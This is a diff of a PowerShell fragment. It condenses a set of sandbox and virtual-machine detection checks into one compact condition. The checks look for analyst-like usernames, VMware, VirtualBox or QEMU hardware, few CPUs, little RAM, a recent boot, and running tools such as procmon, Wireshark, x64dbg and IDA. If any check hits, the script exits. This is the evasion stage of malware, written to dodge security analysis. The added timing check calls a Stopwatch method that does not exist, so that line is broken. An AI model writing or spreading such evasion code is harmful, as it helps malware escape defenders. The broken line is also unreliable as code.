@@ -1,28 +1,22 @@
 try {
-    $cs = gwmi Win32_ComputerSystem
-    $os = gwmi Win32_OperatingSystem
-    $proc = gwmi Win32_Processor
-    $mem = [math]::Round($cs.TotalPhysicalMemory / 1GB)
+    $cs=gwmi Win32_ComputerSystem
+    $os=gwmi Win32_OperatingSystem
+    $pr=gwmi Win32_Processor
+    $mem=[math]::Round($cs.TotalPhysicalMemory/1GB)
 
-    # Sandbox Indicators
-    $indicators = @(
-        ($cs.UserName -match 'sandbox|malware|test|analyst'),
-        ($env:USERNAME -match 'sandbox|malware|test|analyst'),
-        ($cs.Name -match 'sandbox|test|win7|anyrun'),
-        ($cs.Domain -match 'sandbox|maltest|workgroup'),
-        ($proc.NumberOfLogicalProcessors -le 2),
-        ($mem -lt 2),
-        ($os.LastBootUpTime -gt (Get-Date).AddMinutes(-5)),
-        (Get-WmiObject Win32_DiskDrive | Where-Object { $_.Model -match 'VBOX|VMWARE|QEMU|XEN' })
-    )
+    if(($cs.Manufacturer -match 'VMware|VirtualBox' -or $cs.Model -match 'Virtual|KVM') -or
+       ($cs.UserName -match 'sandbox|test|analyst') -or
+       ($env:USERNAME -match 'sandbox|test|analyst') -or
+       ($cs.Name -match 'sandbox|win7') -or
+       ($cs.Domain -match 'sandbox|workgroup') -or
+       ($pr.NumberOfLogicalProcessors -le 2) -or
+       ($mem -lt 2) -or
+       ($os.LastBootUpTime -gt (Get-Date).AddMinutes(-5)) -or
+       ((gwmi Win32_DiskDrive)|?{$_.Model -match 'VBOX|VMWARE|QEMU|XEN'}) -or
+       (([Diagnostics.Stopwatch]::StartNew()).tap({Start-Sleep -Milliseconds 200; $_.Stop() }).ElapsedMilliseconds -gt 500)
+    ){exit}
 
-    if ($indicators -contains $true) { exit }
-
-    # VM Check
-    if ($cs.Manufacturer -match 'VMware|VirtualBox' -or $cs.Model -match 'Virtual|KVM') { exit }
-
-    # Blacklisted process check
     $b='procexp,procmon,wireshark,fiddler,tcpview,ollydbg,x64dbg,ida,ida64'.Split(',')
     $p=ps|%{$_.Name}
     if($b|?{$p -contains $_}){exit}
-} catch {}
+}catch{}
